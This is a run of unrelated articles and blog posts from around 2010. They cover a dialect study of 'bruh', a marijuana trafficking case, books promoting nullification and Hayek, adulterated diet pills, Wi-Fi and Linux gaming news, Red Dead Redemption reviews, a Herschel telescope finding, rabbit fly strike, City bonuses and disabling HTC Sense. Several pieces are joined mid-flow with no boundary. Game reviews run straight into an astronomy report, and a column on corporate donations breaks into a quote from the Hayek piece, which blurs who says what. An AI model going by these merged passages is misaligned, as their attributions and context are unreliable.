With these distributional counts for each word and phrase of interest in the corpus , we can chart out the demographics using the same normalizing technique used for mapping geographical distributions above : for each word or phrase , dividing the observed weight count in each age group by the total volume of tweets for that age ( otherwise the statistics would be biased toward heavily tweeting age groups , such as 12 - 17 year olds ) and then comparing those computed ratios .
A sanity check again reveals that , yes , women aged 12 - 24 who tweet do love Grey 's Anatomy , Gossip Girl and 90210 , while men aged 35 + like TV shows such as 24 and Mythbusters .
To complete the demographic picture of " bruh " above , we can see that it 's used predominantly by males aged 18 - 24 .
In contrast , a word like " bro " is used comparatively more frequently by females and by all age groups , while a formal word like " brother " is used with more or less equal geographic and gender distribution across the entire US .
Figure 3 : Gender demographics of " bruh "
Figure 4 : Age demographics of " bruh "
Inducing age demographics in this way results in a noisier picture than inducing gender and geographic information , for which the indicators are much more clear ( it 's my intuition , at least , that people over the age of 65 are probably using " bruh " a little less than reported ) .
The sheer volume of information coming from this data source does , however , help to offset this noise – even if there is some fixed amount artificially inflating the probabilities of each age group , we can at least begin to see a picture emerging of the major age groups involved .
An evolving dictionary
The goal of the Lexicalist project is to develop a dictionary that depicts , in real time , the changing demographics of English in the United States , a dictionary that supplements the fundamental meaning of a word or phrase with the current cultural backdrop that 's informing its use today .
My work in the NEH - funded Dynamic Lexicon project has taught me that ( for Ancient Greek and Latin at least ) the language of a given era is not a homogeneous beast able to be captured in a single volume ( or caged in a set of fascicles ) ; it is the language of Caesar plus the language of Vergil and so on .
English two thousand years later in the United States is no different : it is the sum of the hundreds of millions of people who use it , often in very different ways .
By focusing on the demographics of contemporary usage , my hope is to shine a spotlight on all of those millions of individuals and see American English as the product of their distinct and discernable voices .

The grandfather of a family with three generations of marijuana traffickers has been convicted on drug charges by a federal jury in Phoenix .
A jury on Wednesday found Kingsley Lloyd Bowen , 66 , of Brooklyn , N.Y. , guilty of conspiracy to possess more than 2,000 pounds of marijuana with intent to distribute and related charges , according to the U.S. Attorney 's Office in Arizona .
Earlier this year , Bowen 's daughter , 40 - year - old Sandra Marie Bowen ; his daughter 's boyfriend , 36 - year - old Christopher Anthony Williams ; and Bowen 's grandson , 22 - year - old Dillon Ornim Clarke ; pleaded guilty to conspiracy to distribute marijuana .
Sandra Bowen and Williams are Chandler residents , while Clarke lives in Brooklyn .
Prosecutors said the family had mailed marijuana from Arizona to buyers in Florida , New York , Ohio , Pennsylvania , Rhode Island and other states .
The family trafficked at least 6,900 pounds of marijuana , according to a statement from the U.S. Drug Enforcement Administration .
More than $ 900,000 in profits made from the trafficking was laundered through 23 banks accounts .
Kingsley Bowen could face maximum penalty of life in prison , a $ 4,000,000 fine , or both .
Bowen will be sentenced Aug. 30 .
Sandra , Clarke and Williams ' sentencing hearings are set for June 28 .
The defendants are being held in the custody of the U.S. Marshal Service pending sentencing .

Today is the official release date for my new book , Nullification : How to Resist Federal Tyranny in the 21st Century .
Nullification , as many readers of this site already know , refers to the power of a state to refuse to enforce an unconstitutional federal law .
Most Americans have never heard of the idea , or know of it only in caricature — which is pretty much the way the New York Times likes it .
Nullification : How to ... Thomas E. Woods Best Price : $ 2.00 Buy New $ 8.34 ( as of 05:25 EST - Details )
When he memorably laid out the case for nullification in the Kentucky Resolutions of 1798 , Thomas Jefferson argued that if the federal government were allowed to hold a monopoly on determining what its powers were , we would have no right to be surprised when it kept discovering new ones .
I ’ve elaborated on all this in previous articles .
This important — if routinely distorted or even forgotten — history takes on unexpected relevance today , with a resurgence of interest in nullification growing all over the country , and no shortage of unconstitutional laws to which to apply it .
The Tenth Amendment Center ’s Legislative Tracking
Page gives you some idea of the extent of a movement that is only just getting started .
The purpose of my book Nullification is to make the strongest , most solidly referenced case I can in support of one of the healthiest developments in American political life in decades , and to serve as a kind of handbook for those who are serious about pursuing it .
Part II of the book contains eleven important documents hardly any American has read , but which lend additional support to the case for nullification .
One of these documents has not appeared in print anywhere since 1835 , yet it makes some of the strongest arguments for nullification , and against critics , I have ever read .
Meltdown : A Free - Marke ...
Thomas E. Woods Best Price : $ 0.25 Buy New $ 20.00 ( as of 02:20 EST - Details )
You can imagine what the response of critics will be to a book like this .
Let me put that more strongly : you can script the critical replies down to the last syllable .
If the book ’s arguments are addressed at all , they will be treated at a strictly second - grade level .
( Official Left and Right agree on more than they care to admit , an unswerving commitment to nationalism being one of those things . )
The rest of the so - called reply will run like this : Nullification is a secret plot to restore the southern Confederacy , and Woods himself is a sinister person with wicked intentions , before which all his fancy moral and constitutional arguments are nothing but a devious smokescreen .
The Politically Incorr ... Thomas E. Woods Jr. Best Price : $ 1.51 Buy New $ 8.71 ( as of 06:15 EST - Details )
Anyone who actually reads the book , on the other hand , will discover , among many other things , that the Principles of ’ 98 — as these decentralist ideas came to be known — were in fact resorted to more often by northern states than by southern , and from 1798 through the second half of the nineteenth century were used in support of free speech and free trade , and against the fugitive - slave laws , unconstitutional searches and seizures , and the prospect of military conscription , among other examples .
Nullification was employed not in support of slavery but against it .
Today , political decentralization is gathering steam in all parts of the country , for all sorts of reasons .
I fail to see the usefulness of the term " neo-Confederate " — whatever this Orwellian neologism is supposed to mean — in describing a movement that includes California ’s proposal to decriminalize marijuana , two dozen states ’ refusal to abide by the REAL ID Act , and a growing laundry list of resistance movements to federal government intrusion .
As states north and south , east and west , blue and red , large and small discuss the prospects for political decentralization , the zombies can intone scary - sounding propaganda words , instead of engaging in rational argument , all they like .
The grownups , meanwhile , have important matters to discuss .
How the Catholic Churc ...

Who ’s the book ’s intended audience ?
Well , anyone and everyone , of course , as any author will tell you .
But it may have particular appeal to those who actually want to roll back government power , who are prepared to embrace a new approach ( given that all previous efforts against Washington ’s expansion have been abject failures ) , and who are n’t altogether convinced that a vote for Mitt Romney in 2012 means the republic is restored .
The book can also help state legislators who are unaware of or on the fence about nullification , by reassuring them that in taking this seemingly radical step they will be on eminently solid historical and constitutional ground — and that lots of state legislatures are already doing it .
It also takes aim at the various objections that have been raised against nullification , from the merely uncomprehending ( does n’t this violate the Supremacy Clause ? ) , to the more practical ( would n’t nullification be chaotic ? ) , to the historical ( is n’t this all about slavery and oppression ? ) .
33 Questions About Ame ... Thomas E. Woods Best Price : $ 2.91 Buy New $ 9.99 ( as of 07:05 EST - Details )
The various categories of bad guy — e.g. , law professors , Chris Matthews , the New York Times — have responded to the return of nullification about as you ’d expect them to .
Why , the stupid rubes think they can resist their overlords !
Smear !
Destroy !
Crush !
To the extent that such critics make any arguments at all , as opposed to mere character assassination , they either beg the question entirely or reveal a lack of acquaintance with the primary source material that would be embarrassing if such people were capable of embarrassment .
As I noted above , I ’ve actually included a good portion of that source material in Part II of Nullification .
Including these documents ( 1 ) makes it marginally more difficult for critics to pretend such documents do not exist , ( 2 ) helps supply advocates of nullification with additional supporting material , and ( 3 ) arms high school and college students with material they can use to drive their teachers and professors crazy , since almost none of them will be familiar with it .
As I promote the book I ’ll surely be posting about my exploits on the LewRockwell.com blog , as well as on my Facebook page , my Twitter account , and my YouTube channel .
It ’s hard to say whether a book like this will get much media exposure , so I ’d be grateful for anything supportive readers might do to help get the word out about it .
I ’ll also be doing some traveling .
Over the next few months I ’ll be in Las Vegas , Nashville , Austin , Philadelphia ( King of Prussia ) , Orlando , Eau Claire ( Wisconsin ) , Dallas , Colorado Springs , Bloomington ( Indiana University ) , Houston , Auburn ( Alabama ) , and Phoenix ; at most of these events I ’ll be discussing the book , and at all of them I ’ll have copies .
Here ’s my full schedule .
Never did I imagine that an issue I assumed would ( unfortunately ) remain a historical curiosity might actually be resuscitated .
To my amazement , it ’s being proposed all over the country , in the service of all sorts of good causes .
I hope my book encourages more of it , provides supporters with useful intellectual ammunition , and explodes the idea that all we can do in the face of this regime is sit back and take it .

Slimming pills in online shops contain sibutramine and carcinogenic laxative
When analysts at the Universite de Toulouse examined 20 slimming supplements sold online , they discovered that 14 contained substances they were not supposed to contain , and which were not mentioned on the label .
The main culprit was the amphetamine - like appetite suppressant sibutramine [ chemical structure below ] .
Second place went to the laxative phenolphtalein .
Sibutramine [ structural formula shown here ] is no longer allowed to be sold as a medicine in the EU .
The ruling came two months ago as a result of a big European study that showed that sibutramine users had 16 percent more chance of developing serious cardiovascular problems than non-users .
Sibutramine is still available as a medicine outside the EU .
Laxatives containing phenolphthalein were taken off the market in the US at the end of the nineties after animal studies had shown that phenolphthalein was carcinogenic .
[ J Natl Cancer Inst. 2000 Dec 6;92(23 ) :1943 -4. ]
Below we summarise some of the results of the analyses in the French publication .
1 . Hyperdrive 3.0 +
A month ago media wrote about the amphetamine oxilofrine , alias methyl synephrine , in ALRI 's Hyperdrive 3.0+ .
[ First Edition Cycling News , April 16 , 2010 ]
It was the cause of American cyclist Flavia Oliveira 's 2 - year suspension by the doping authority .
The researchers also found the substance in batch 110802 when they examined it .
One capsule contains 38 mg of the stuff .
[ Of natural origin ?
We find this difficult to believe ...]
On top of that the researchers found 185 mg caffeine and 75 mg vitaberine , an eccentric analogue of vitamin B1 .
All these substances are listed on the label .
According to the label , Hyperdrive 3.0 + also contains lipoic acid and tyrosine ethyl ester .
But the researchers could n't find these two substances .
The other natural compounds listed on the label were only present in ' very low amounts ' .
2 . Lipro Lipro diet pills , made by China Karyhen International , contain nothing but Chinese herbs according to the label .
Well , forget it .
Each capsule of Lipro contains about 30 mg sibutramine .
They contain ' very low amounts of natural sugars including glucose ' .
The researchers analysed batch number 20081020 .
3 . Botanical Slimming Chinese manufacturer Meizitang makes slimming products like Botanical Slimming Soft Gel and Botanical Slimming Herbs , which the maker claims are full of Mother Nature 's slimming ingredients .
No sir .
In each capsule of Botanical Slimming Soft Gel [ batch number 20081006 was tested ] and Botanical Slimming Herbs [ batch number 0991 - 8280809 ] the researchers found 12 mg sibutramine .
The Botanical Slimming Herbs capsules also contained 4 mg phenolphthalein .
Natural ingredients were only present in minute quantities .
Meizitang became known in 2006 when the Germany food authorities discovered sibutramine in Meizitang 's LiDa slimming products .
4 . 2 Day Diet The Japanese 2 Day Diet contains the authentic " Japanese Lingzhi slimming formula " according to the label , said to aid natural weight loss and ease constipation .
Mother Nature 's work ?
Of course not .
In these capsules [ no batch number ] the researchers found 11 mg sibutramine and ' very low amounts of natural compounds including glucose and fatty acids ' .
5 . Perfect Slim Tested : an unidentified batch of Perfect Slim , Perfect Slim Cherry [ tested : batch number 2007070183 ] and Perfect Slim Grape [ tested : batch number 2007080601 ] .
All made by Chun Tian .
The composition of all these capsules is almost identical .
Each capsule contains a mixture of 13 - 20 mg sibutramine , 40 - 66 mg phenolphthalein , vitamin C plus ' very low amounts of natural compounds ' .
Perfect Slim Grape contains no vitamin C. Source :

The industry group that supports Wi-Fi is adopting a new technology that should boost data speeds more than 10 times at short distances , which could replace video cables in the home entertainment center .
The Wi-Fi Alliance said it is joining up with the Wireless Gigabit Alliance , or WiGig , which has been developing ways to exploit the 60 gigahertz frequency band for extremely high data speeds between devices in the same room .
The technology will probably take two years to show up in products , said Wi -Fi Alliance marketing director Kelly Davis - Felner .
The first ones might be Blu-ray players that can send their high - definition video signal wirelessly to compatible TV sets .
Later , portable devices such as video cameras could get the ability to send video wirelessly .
A separate group , the WirelessHD Consortium , has developed technology to exploit the same frequency band with the same aims .
WirelessHD is further along in development .
It is used in some paired transmitters and receivers for HD video that came out last year .
The focus of WirelessHD was originally narrower , only video and audio streaming , but it has recently expanded to include data networking , just like WiGig .
John Marshall , chairman of the WirelessHD Consortium , said its technology is more suitable for high - quality video streaming , and less suitable for use in portable devices .
It 's possible the technologies will coexist .
Several powerhouses of the computer and consumer electronics industry are members of both groups , including Intel Corp. , Samsung Electronics Co. , Panasonic Corp. and Toshiba Corp .
In addition to WirelessHD and WiGig , it 's possible to carry video on today 's Wi-Fi bands , 2.4 GHz and 5 GHz .
That 's a cheaper option with longer range , but the video quality is slightly degraded and there is a slight transmission delay .

One constant complaint about the Linux desktop is that it does n't have enough games .
That 's actually not true .
Linux has plenty of games .
What these people usually mean is that it does n't have their favorite Windows games .
Now that 's changing .
Granted , Linux has never been a big gaming platform .
Some have suggested that it might be a good idea for vendors to work on making Linux a gaming platform for its own high - end games , but little has come of this idea .
Of course , it 's always been possible to run many popular Windows games on Linux .
I play Guild Wars , a Windows - based MMORPG ( Massively multi- player online role - playing game ) , competitively in player vs. player mode on Linux all the time .
If it did n't work great on Linux , I 'd be running it on a Windows 7 PC .
Two recent developments have made it even easier to run Windows games on Linux though .
The first , as reported by Phoronix , is that Valve , makers of the Steam gaming system and content delivery platform , will be releasing a Steam client to Linux later this summer .
While you could run Steam on Linux before , it was both slow and difficult to set up properly .
Now we can look forward to a full Steam gaming experience on Linux .
The Steam Linux client is already available in a closed beta .
And 3D graphical card support on Linux has improved , which will help give players a good game experience .
Linux users can look forward to playing native versions of such popular games as Quake Wars , Doom 3 .
Half - Life 2 , Counter - Strike : Source , and Team Fortress 2 .
The other development is that CodeWeavers has released a new and significantly improved version of Crossover Games .
CrossOver Games is based on the open - source project Wine , an implementation of the Windows API that runs on top of the Unix / Linux operating system family .
You can run Windows games on Linux , including Steam - based ones , with Wine alone , but you 'll need to be an expert Linux user and have a good idea of what each game demands from its environment to pull those tricks off .
Unless you 're the kind of person that enjoying working on technology more than playing games , you 're better off buying CrossOver Games .
This new edition , version 9.0 , features an easier - to - user game installation routine , thousands of minor improvements , and a feature that lets gamers share ' Compatibility Profiles , ' or ' c4p ' files .
These enable users to create and share custom set - up recipes for officially unsupported games , so that others can install them without having to get their hands dirty with finicky customized set - up .
The net result , CodeWeavers promises , is that you can now play a good deal many more Windows games on Linux and the ones you could play before are now more responsive .
I 've already played with it for a few days , but it looks to me like that CodeWeavers has a winner on its hand .
You can see it for yourself by downloading a trial version of Crossover Games that will run for 7 days .
The full price is $ 39.95 .
This story , " Running Windows Games on Linux Gets Easier " was originally published by Computerworld .
Red Dead Redemption , after numerous delays for extra polish , has finally made it to store shelves .
IGN posted its review last week , but that 's only one man 's opinion .
Today we present to you other thoughts , critiques , and general feelings from the IGN editorial staff about Rockstar 's sandiest sandbox game yet .
see deal Red Dead Redemption : Game of the Year Edition - PlayStation 3 $ 19.99 on Gamestop
: What really makes Red Dead Redemption successful is the context of the Old West in America .
There was a thin line between life and death in this setting .
If you did n't fall to disease or exposure there was a good chance that the lawless populace would take you down .
The heavy consequences for even the slightest of actions make for gripping gameplay .
And what 's really amazing about the story is that the themes are even more relevant today than the issues players struggled with in Grand Theft Auto IV .
The arguments about technology invading our lives , independence from the government and what constitutes a " real " American still pervade our everyday lives . :
Getting through games I 'm writing guides for is always a slow process .
And because I 'm writing the Red Dead Redemption guide , I have n't gotten very far in the game ( I 'm about 25 percent through , according to the in - game statistics ) .
But I 've certainly developed some feelings on the game that I think shine through .
First and foremost , the game is better than Grand Theft Auto IV .
Hands - down .
Though the games clearly share a lot with one another , from the engine to the aesthetics -- even the overall gameplay -- there 's something far more endearing about Red Dead Redemption .
Now , that says something , because I thought Grand Theft Auto IV was a stellar game in its own right .
But Red Dead feels even more special to me .
It 's one of those games that you 'll never forget playing .
There 's very little not to like about it .
In Red Dead , you can see the things that Rockstar usually gets right , and usually gets wrong .
Its voice - acting , writing , storytelling and presentation are virtually unparalleled in our industry , with only a few other developers , like BioWare or Bethesda , even remotely capable of rivaling what Rockstar conveys in this realm .
Then again , the game is mildly buggy and a bit repetitive at times .
But those are minor qualms with an otherwise amazing package .
Red Dead Redemption is , in my estimation , the third best game of the year : I 've put a considerable amount of time into Red Dead Redemption , and so far I 've spent the majority of it doing nothing of consequence .
I play Poker for hours upon hours .
I ride my horse around the landscape , with absolutely no goal in mind .
I explore abandoned camps and settlements , hunting for hidden stashes of money .
I 've got a badass rifle though .
That counts for something , right ?
But that 's why Red Dead captures me in a way that GTA never did .
It 's a different world , a different era , one that I do n't see when I walk down the street .
Quite frankly I live with some of the Grand Theft Auto world every day -- spend 30 minutes dealing with the insane and wealthy drivers in Beverly Hills and you have about 50 percent of the GTA experience .
But Red Dead brings back something Hollywood only touches with rare productions like Deadwood or 3:10 to Yuma .
Rockstar 's renowned attention to detail creates something that feels so real and evokes such a reaction that you will start to believe you 're in the wild west .
Try not to ride slow when you see a beautiful landscape or sunset .
All I 've managed to mention is the world that has been created for Red Dead , and for some reason that 's all that matters to me .
It makes the game .
I 've seen disappearing weapons and chairs , flying people and everything between .
Sure , my horse is a bit tough to control .
I 'm still not entirely sure why I 'm rapidly pressing " A " to run when I have an analog joystick .
But I do n't care .
I can still gamble on that straight flush with some old - fashioned ruffians .
I can still have a shootout at an abandoned fort .
I can still accept a mission from an old lady .. who I then rope , drag across the dusty desert , and knife in the shadow of the mountains while bounty hunters attempt ( in vain ) to track me down .
What 's not to love about that ? :
Let me start by saying that I have never been captivated by a Rockstar game until Red Dead Redemption came along .
I played some of Bully and Grand Theft Auto IV , but never felt compelled to return to them .
With Red Dead , I count down the hours at work until I can go home and continue my adventures as John Marston .
Perhaps I prefer the western because it feels more " open " than the other worlds .
Sure , you can technically do whatever you want in Grand Theft Auto and Bully , but if you hate being reprimanded for your actions ( like me ) , you 're restricted because of the close proximity of other people .
The landscape of Red Dead is quite the opposite of a cramped city or private school -- there 's space to roam and wiggle room to be a little bit bad if you want to without the consequences of urban civilization .
You can slaughter innocent campers or just join them for a nice fireside chat and I enjoy that kind of freedom .
Sure the story is interesting and the characters are unique , but more importantly it 's just fun to run around the wilderness on horseback trying to find things to shoot dead .
The Herschel Space Observatory has made a major finding -- a hole in space .
The space telescope , which was launched almost exactly a year ago by the European Space Agency , spotted a gaping hole in the clouds surrounding a batch of young stars .
The dark spot , or hole in space , actually is a gap in a " nest " of gas and dust containing fledgling stars , according to NASA .
Herschel observatory 's finding : A hole in space .
Courtesy : NASA .
The hole is close to a triple star system called V38O Ori.
NASA scientists said the hole appears to have been created when one of the three stars in the system launched a jet of radiation , creating a gap in the swirl of gas and dust that contains fledgling stars .
They also theorize that jets and stellar radiation from other stars contributed to the gap .
" No one has ever seen a hole like this , " said Tom Megeath of the University of Toledo , Ohio , in a written statement .
" It 's as surprising as knowing you have worms tunneling under your lawn , but finding one morning that they have created a huge , yawning pit . "
Megeath is the principal investigator of the research and works in conjunction with NASA .
Herschel is helping scientists study the formation of stars , which are born hidden in dense clouds of dust and gas .
And NASA noted yesterday that while researchers have seen jets and winds of gas streaming from young stars in the past , it has been a mystery exactly how a star uses the jets to blow away its surroundings and emerge from its birth cloud .
For the first time , Herschel may be seeing an unexpected step in this process .
When scientists first spotted the hole , they thought it was a particularly dark cloud until Herschel delivered an infrared image of it , allowing them to see that it actually is a hole in the gas and dust surrounding the young stars .
NASA noted that the hole actually looks " truly empty . "
Herschel , which carries the largest mirror ever launched into space , is designed to observe a mostly uncharted part of the electromagnetic spectrum to gain more information about the birth of stars and galaxies , along with dust clouds and planet - forming discs around stars .
Herschel also will be looking for water , one of the key elements of life , in remote parts of the universe .

Many people , even those who own pet rabbits , have never heard of this problem .
For some their knowledge comes too late , their pet is already dead .
Although Fly Strike is most common in rabbits , and sheep , it can occur in any vertebrate animal – even humans .
What happens usually is that an animals rump becomes dirty with feces ( poop ) .
This attracts flies who lay their eggs on the animals rear .
Other times the problem starts when a wound is left open and untreated .
The flies , attracted by the smell of rotting flesh , lay their eggs on the wound .
Either way in 8 to 24 hours the eggs hatch and maggots are born .
Maggots have proven helpful to humans , and are sometimes uses in the medical field , particularly in therapy to eat dead flesh , but in this case they may be feasting on live flesh , particularly when laid on the animals rump .
The blowfly ( also known as the green - bottle , or bluebottle , fly ) is the animal chiefly responsible for this condition , intentionally looking for such situations in which to lay their eggs .
When Fly Strike occurs because of blowflies it is specifically referred to as Myiasis .
Other flies , such as the housefly , may also lay eggs on an animals dirty rump , being attracted to it by the waste , although they were not intentionally looking for an animal to lay their eggs upon .
Either way the fly maggots eat the live animal .
They release toxins into the animal and within a day bacteria infections also take hold .
If untreated fly strike leads to death .
In rabbits the problem of fly strike is a fast , and almost certain killer .
The owner must take their pet to a veterinarian immediately .

Treatment of Fly Strike
Removal of the maggots is important , and an owner can try to remove some themselves , but rabbit skin is thin and requires gentle handling .
A veterinarian is more skilled and will have trained assistants and even anesthesia if needed .
Additionally the vet can shave the animals rear and prescribe any antibiotics that the animal should be in need of to treat the bacterial infection .
Fly strike should be considered an emergency situation .
Do not wait until the following day .
How to Prevent of Fly Strike
Prevention of fly strike , or myiasis is difficult , but not impossible .
Talk to a vet in your area to find out how common this problem is and what preventative measures they suggest .
Keep your pets bottom dry and clean .
Rabbits generally do not like bathing , but if you bath your rabbit be sure it is thoroughly dry before you put it back in its cage .
Pet rabbits who are kept outdoors need to be checked twice daily for signs of maggots .
Their hutch can be covered with netting to prevent flies from entering .
In sheep this is one of the reasons why lambs have their tails docked at an early age .
It should be noted that hair sheep do not have this problem as often .
Keeping animals in uncrowded conditions and keeping the barn clean will also help keep flies from gathering .
Chickens , ducks , and guinea fowl , are known to be fond of eating flies and will keep their population down in an area .
A caution against using insecticides .
Many are not effective against blowflies and these chemicals are always a risk around pets and other animals .

Pay and bonuses in the City are surging back to their pre-crash levels despite widespread criticism of the Square Mile and the banking industry , which was rescued by the taxpayer 18 months ago .
The steep rise in earnings is likely to put pressure on the coalition government to impose a clampdown on City pay practices , which the Liberal Democrats in particular attacked while in opposition .
Guardian analysis of data from the Office for National Statistics shows that bankers were paid £ 8.5 bn in bonuses in the four months to April , compared with £ 7bn during the same period last year .
There was also a jump in pay across the industry of £ 1bn to £ 12bn as bankers shifted some of their earnings away from bonuses to avoid the former Labour government 's bonus tax .
The result of the pay and bonus increases took the combined earnings for the bonus season to £ 20.5 bn compared with £ 24bn at the height of the boom in 2007 .
Investment banks traditionally pay staff bonuses in the run-up to the end of the tax year in April .
For the last three years the Guardian has analysed ONS pay data to show how bonuses make up a large proportion of City pay .
In many instances rewards amount to millions of pounds compared to an average of almost £ 7,000 across the industry .
Last year Vince Cable , now the business secretary in the new administration , said the City had shown " a complete lack of awareness of the extent of the financial crisis , their role in creating it and the extent to which they are ultimately answerable to the taxpayer " .
Lib Dem peer Lord Oakeshott said of the new data tonight : " This is the unacceptable face of capitalism .
The coalition agreement promised to bring forward proposals for robust action to tackle these practices . "
A spokesman for the British Bankers Association said the bulk of workers in the industry received on small bonuses or no bonus at all .
" For those who do receive a bonus , this is based on their contribution to the business during the year , " he said .
" The financial services sector makes a huge contribution to the UK economy and to keep that world - leading position you have to employ the best people – and that means paying a competitive remuneration package . "
Recruitment consultants in the City report that appointments has gained speed in recent months as investment banks poach staff from their rivals .
One consultant said the demand for staff had increased in recent months in response to the return of mergers and acquisitions and major fundraising exercises by major corporations .
Senior back - office staff can also command high salaries and bonuses after redundancies last year left a shortage of experienced workers .
More than 60,000 staff left the industry after the crash .
While Royal Bank of Scotland has continued to cut its workforce , it has insisted on paying bonuses to staff in its investment banking division .
Stephen Hester , the bank 's chief executive , has lobbied ministers to protect bonus payments , which he argued prevented experienced staff from leaving to join rival banks .
So here ’s how it is :
They ’re as mad as hell , and they ’re not going to take this anymore .
Am I talking about the Tea Partiers ?
No , I ’m talking about the corporations .
Much reporting on opposition to the Obama administration portrays it as a sort of populist uprising .
Yet the antics of the socialism - and - death - panels crowd are only part of the story of anti-Obamaism , and arguably the less important part .
If you really want to know what ’s going on , watch the corporations .
How can you do that ?
Follow the money — donations by corporate political action committees .
Look , for example , at the campaign contributions of commercial banks — traditionally Republican - leaning , but only mildly so .
So far this year , according to The Washington Post , 63 percent of spending by banks ’ corporate PACs has gone to Republicans , up from 53 percent last year .
Securities and investment firms , traditionally Democratic - leaning , are now giving more money to Republicans .
And oil and gas companies , always Republican - leaning , have gone all out , bestowing 76 percent of their largess on the G.O.P .
These are extraordinary numbers given the normal tendency of corporate money to flow to the party in power .
Corporate America , however , really , truly hates the current administration .
Wall Street , for example , is in “ a state of bitter , seething , hysterical fury ” toward the president , writes John Heilemann of New York magazine .
What ’s going on ?
" Every economy has its contradictions .
What counts is results , and there can be no doubt that the Soviet planning system has been a powerful engine for economic growth . "

" The Road to Serfdom was ‘ inaccurate innuendo about the future ’ . " ~ Paul Samuelson , 2009
When Friedrich A. Hayek published his classic book , The Road to Serfdom , in 1944 he was loudly denounced by academic statist apologists in England , where he resided at the time , and in America .
In the preface to the 1976 edition of the book Hayek noted that a prominent philosopher even denounced the book despite admitting that he had not read it !
But average citizens did read it .
The book was a gigantic success in America , quickly selling over half a million copies .
Millions of copies of a condensed Reader ’s Digest version of the book were also sold and widely read .

The court historians in academe were not concerned about Hayek ’s age - old warnings about the dangers that centralized political power posed to liberty and prosperity , for they intended to be beneficiaries of that power as well - paid advisers to the state .
Millions of average citizens were not as enthusiastic , especially Americans who , during the war , had experienced oppressive and confiscatory taxation , the slavery of military conscription , government - imposed product rationing , pervasive shortages of basic staples , and endless bureaucratic bungling .
Hayek ’s motivation for writing The Road to Serfdom was the shocking speed at which so many Europeans — especially in Germany — had simply forgotten all that they had learned over the centuries about the virtues of a free society , the need for limitations on government power , the dangers of centralized power , and the workings of capitalism as a worldwide network of mutually advantageous exchange .
It only took a couple of decades of socialistic sloganeering to persuade Germans to abandon their classical - liberal roots and embrace Big Government of the worst sort .
Hayek was deeply concerned that the same despotic ideas were also becoming more and more popular in England , America , and in other countries .
As the above quotations of MIT ’s Paul Samuelson demonstrate , much of America ’s educational " elite " was enamored with Soviet communism and central planning .
Samuelson even went so far as to say in his textbook , which was by far the biggest seller of its day , that " it is a vulgar mistake to think most people in Eastern Europe [ during communism ] are miserable . "

The parallels to today ’s world are unsettling , to say the least .
Perhaps this is why , a few weeks ago , The Road to Serfdom ascended to # 1 in sales on Amazon.com after Glenn Beck discussed the book on his Fox News Channel program .
There may not be a Hitler on the horizon , but the extent to which governments all over the world have simply ignored the lessons of the past in response to the economic crisis that they created with their own monetary policies and other interventions is mind - boggling .
The US government , in particular , responded to the bust portion of the Greenspan Fed ’s boom - and - bust cycle with the most economically destructive — but politically centralizing — policies : trillion - dollar bailouts of failing corporations that will create moral - hazard problems the likes of which have never been seen ; an escalation of the money supply that dwarfs the monetary inflation of the Greenspan Fed ; the Soviet - style nationalization of automobile companies , banks , and much of the healthcare industry ; government regulation of executive compensation ; the appointment of dozens of dictatorial " czars " with unaccountable power to regulate and regiment myriad industries ; trillion - dollar - a - year deficits ; an expansion of the powers of the Fed (! ) ; and a president who believes he has the power to fire corporate executives , nationalize industries , and send unmanned " drone " bombers to any country in the world on a whim .
Washington DC no longer recognizes any limits at all to its powers to " socially plan " all aspects of American life .
This totalitarian impulse is not limited to national politics .
The mayor of New York City believes he has the power to regulate all of the eating and drinking habits of New Yorkers , even including how much salt they consume with their meals and what type of soft drinks they can enjoy .

The subtitle of the 1976 edition of The Road to Serfdom , published by the University of Chicago Press , is " A Classic Warning Against the Dangers to Freedom Inherent in Social Planning . "
The exponential explosion of governmental powers in response to the current , government - generated economic crisis makes
The Road to Serfdom as relevant today as it ever was ( as Glenn Beck ’s audience instinctively understands ) .
This is why the Mises Institute is offering a special five - week online class , The Road to Serfdom : Despotism Then and Now , under my direction through the Mises Academy , beginning on Monday , July 5 .
The course will be an in - depth examination and discussion of Hayek ’s analysis , its relevance to today ’s world , and how such ideas can be used to put America — and other parts of the world — back on the road to freedom .
Hayek ’s insights were remarkable , and remain so to this day .
He understood and explained the power of ideas : European fascism could never have been adopted without a 25 - year propaganda campaign against individualism ( basic respect for the individual ) , classical liberalism , and free - market economics .
He pointed out the " fatal conceit " of believing that government bureaucrats could " plan " an entire society .
He explained why socialism — including its fascist variant — meant little more than " equality in restraint and servitude . "
" Marxism has led to Fascism and National Socialism , " he wrote , " because , in all its essentials , it is Fascism and National Socialism [ i.e. , Nazism ] . "
How Capitalism Saved A... Dilorenzo , Thomas J. Best Price : $ 2.18 Buy New $ 7.37 ( as of 12:45 EST - Details )
Hayek saw through all the rhetorical tricks and gimmicks of the socialists of his day , one of which was the constantly repeated refrain that socialism and government " planning " was " inevitable " ; therefore , it is futile to oppose it .
Nor did he fall for the gimmick of wrapping totalitarian socialism in the mantle of the god of democracy .
Government planning is inherently incompatible with both democracy and the rule of law in the long run , he explained , and leads to some degree of economic dictatorship .
Any business person who has had to deal with the dozens of federal , state , and local government regulatory agencies knows that " economic dictatorship " is a key feature of the current American political system .
" The worst " always rise to the top of the political heap under a regime of government planning , Hayek explained , for they are the ones with the least qualms about brutalizing their fellow citizens and depriving them of their liberties .
All of this can only be sustained by what Hayek called " The End of Truth , " or the effects of massive government propaganda that demonizes the civil society , individualism , and the system of peaceful voluntary exchange and private property ( capitalism ) , while glorifying all aspects of the state .
The purpose of this course , The Road to Serfdom : Despotism
Then and Now , is to educate students about these contemporary dangers and arm them with the intellectual ammunition that they will need to oppose them and champion freedom instead .
The totalitarian socialists of the early 20th century understood that they could not succeed unless they first discredited the ideas of freedom .
The only way to stop their intellectual descendants ( " the totalitarians in our midst , " as Hayek would call them ) is to counter their totalitarian ideas .
Hayek was a hero of society for putting his career as a renowned economic theorist on hold ( for most of the rest of his life , it turned out ) to lay out one of the most articulate arguments for a free society ever made .
We must revisit and strengthen these arguments if we are to choose capitalism and freedom over socialism and serfdom .

We still think it 's kind of cheating to want to run an HTC phone without the Sense user interface , but we 're also champions of choice .
And so , we bring you instructions on how to turn off the Sense UI on the Sprint Evo 4G .
And we ran a couple more benchmarking tests to see if there was any noticeable speed difference once Sense was gone .
Our results , after the break .
So as you see in the video , we did n't get much of a speed boost , at least as far as Linpack and Neocore were concerned .
In fact , the only major change we noted is one that you do n't see here -- we had a couple of reboots ( as in the phone completely reset itself ) .
Once as we were struggling to turn off a live wallpaper , and another time while we were on a phone call .
That could just be a fluke , or it could have something to do with stability .
Not sure just yet , and we 'll have to toy with that some more .
You also lose access to the HTC widgets , so you 'll need to take that into consideration , too .
Otherwise , it ran just fine .
